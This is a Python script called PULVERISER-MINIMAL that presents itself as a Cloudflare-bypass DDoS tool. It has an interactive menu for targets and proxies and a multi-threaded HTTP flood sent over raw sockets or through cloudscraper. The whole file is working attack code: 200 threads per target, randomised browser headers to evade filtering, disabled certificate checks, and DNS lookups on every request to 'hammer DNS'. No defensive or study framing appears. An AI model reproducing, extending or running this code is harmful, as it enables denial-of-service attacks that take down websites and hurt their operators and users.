#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PULVERISER-MINIMAL - CLOUDFLARE BYPASS DDoS via raw sockets + threading
# Uses only Python stdlib. Optional cloudscraper for real CF bypass.
# Target menu, proxy support, multi-threaded high-rate HTTP flood.

import socket
import ssl
import threading
import time
import random
import sys
import os
from urllib.parse import urlparse

# ---------- CONFIG ----------
THREADS_PER_TARGET = 200       # concurrent connections per target
BURST_DURATION = 60            # seconds per burst
SOCKET_TIMEOUT = 8
RETRY_DELAY = 0.05
# ----------------------------

# Random browser fingerprints
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]
ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]
ACCEPT_LANG = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]

# ---------- TARGET MANAGEMENT ----------
targets = []      # dict: {url, method, postdata}
proxies = []      # strings: ip:port
attack_running = False
# Try optional Cloudscraper (real bypass)
cloudscraper_available = False
try:
    import cloudscraper
    scraper = cloudscraper.create_scraper()
    cloudscraper_available = True
except:
    scraper = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_menu():
    clear_screen()
    print("=== PULVERISER MINIMAL ===")
    print(f" Targets: {len(targets)}  Proxies: {len(proxies)}")
    for i,t in enumerate(targets):
        print(f"  [{i}] {t['method']} {t['url']}")
    print("\n add <url> [method=GET] [postdata]")
    print(" addproxy <ip:port>")
    print(" del <idx>  |  clear  |  start  |  stop  |  exit")
    print("===============================")

def add_target(url, method="GET", post_data=""):
    if not url.startswith(('http://','https://')):
        url = 'https://'+url
    parsed = urlparse(url)
    if not parsed.netloc:
        print("[!] Invalid URL")
        return
    targets.append({'url':url, 'method':method.upper(), 'post_data':post_data})
    print(f"[+] Added: {method.upper()} {url}")

def add_proxy(proxy_str):
    proxies.append(proxy_str)
    print(f"[+] Proxy added: {proxy_str}")

def del_target(idx):
    try:
        removed = targets.pop(int(idx))
        print(f"[-] Removed: {removed['url']}")
    except:
        print("[!] Invalid index")

# ---------- RAW SOCKET ATTACK ----------
def build_http_request(host, port, target_dict, path, use_ssl):
    """Craft a raw HTTP 1.1 request with random headers."""
    method = target_dict['method']
    post = target_dict['post_data']
    ua = random.choice(USER_AGENTS)
    accept = random.choice(ACCEPT)
    lang = random.choice(ACCEPT_LANG)

    if method == "POST":
        data_len = len(post.encode())
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: {accept}\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {data_len}\r\n"
            f"\r\n"
            f"{post}"
        )
    else:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: {accept}\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
    return req.encode()

def socket_flood(target_dict):
    """Worker thread: open raw socket, send requests continuously."""
    url = target_dict['url']
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    use_ssl = parsed.scheme == "https"
    if port is None:
        port = 443 if use_ssl else 80

    # Use proxy if available (simple forward, no auth)
    proxy = random.choice(proxies) if proxies else None
    if proxy:
        proxy_ip, proxy_port = proxy.split(':')
        dest_ip = proxy_ip
        dest_port = int(proxy_port)
        # For HTTPS over proxy we'd need CONNECT tunnel - omitted for simplicity,
        # the proxy feature here is best with HTTP targets.
        # We'll just connect to proxy and send the absolute URL.
        if use_ssl:
            # can't tunnel easily with raw socket; skip proxy for HTTPS.
            dest_ip, dest_port = host, port
            proxy = None
        else:
            path = url  # absolute path for proxy
    else:
        # resolve host every time to hammer DNS
        try:
            dest_ip = socket.gethostbyname(host)
        except:
            return
        dest_port = port

    sock = None
    while attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            if use_ssl and not proxy:
                # wrap with SSL (ignore cert errors)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((dest_ip, dest_port))
            req = build_http_request(host, port, target_dict, path, use_ssl)
            sock.sendall(req)
            # read a bit to drain response (keeps connection alive)
            try:
                sock.recv(4096)
            except:
                pass
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        time.sleep(random.uniform(0, 0.02))  # minimal backoff

def cloudscraper_flood(target_dict):
    """If cloudscraper is installed, use its session to bypass CF challenges."""
    if not cloudscraper_available:
        return
    url = target_dict['url']
    method = target_dict['method']
    post = target_dict['post_data']
    while attack_running:
        try:
            if method == "POST":
                scraper.post(url, data=post, timeout=10)
            else:
                scraper.get(url, timeout=10)
        except:
            pass
        time.sleep(random.uniform(0, 0.05))

def attack_target(target_dict):
    """Launch thread pool against one target."""
    print(f"[*] Attacking {target_dict['url']} ...")
    threads = []
    # Use cloudscraper threads if available, else raw sockets
    flood_func = cloudscraper_flood if cloudscraper_available else socket_flood
    for _ in range(THREADS_PER_TARGET):
        t = threading.Thread(target=flood_func, args=(target_dict,), daemon=True)
        t.start()
        threads.append(t)
    time.sleep(BURST_DURATION)
    # stop attack for this round (threads die when attack_running becomes False)
    # We don't stop globally, just let threads finish their loop after attack_running flag changes.
    # We'll temporarily pause by returning; the main loop will set attack_running True again for next target.
    print(f"[*] Burst finished for {target_dict['url']}")

def attack_cycle():
    """Main loop cycling through targets."""
    global attack_running
    while attack_running and targets:
        for tgt in targets:
            if not attack_running:
                break
            attack_target(tgt)
            time.sleep(1)

# ---------- MAIN ----------
def main_loop():
    global attack_running
    while True:
        show_menu()
        cmd = input("> ").strip().split()
        if not cmd:
            continue
        action = cmd[0].lower()
        if action == "add":
            if len(cmd) < 2:
                print("Usage: add <url> [method=GET] [postdata]")
                continue
            url = cmd[1]
            method = cmd[2] if len(cmd)>2 else "GET"
            post = cmd[3] if len(cmd)>3 else ""
            add_target(url, method, post)
        elif action == "addproxy":
            if len(cmd) < 2:
                print("Usage: addproxy <ip:port>")
                continue
            add_proxy(cmd[1])
        elif action == "del":
            if len(cmd) < 2:
                print("Usage: del <index>")
                continue
            del_target(cmd[1])
        elif action == "clear":
            targets.clear()
            print("[*] Targets cleared")
        elif action == "start":
            if not targets:
                print("[!] No targets")
                continue
            if attack_running:
                print("[!] Already running")
                continue
            attack_running = True
            threading.Thread(target=attack_cycle, daemon=True).start()
            print("[*] Attack started.")
        elif action == "stop":
            attack_running = False
            print("[*] Stopping...")
        elif action == "exit":
            attack_running = False
            print("[*] Exiting...")
            sys.exit(0)
        else:
            print("[!] Unknown command")

if __name__ == "__main__":
    main_loop()
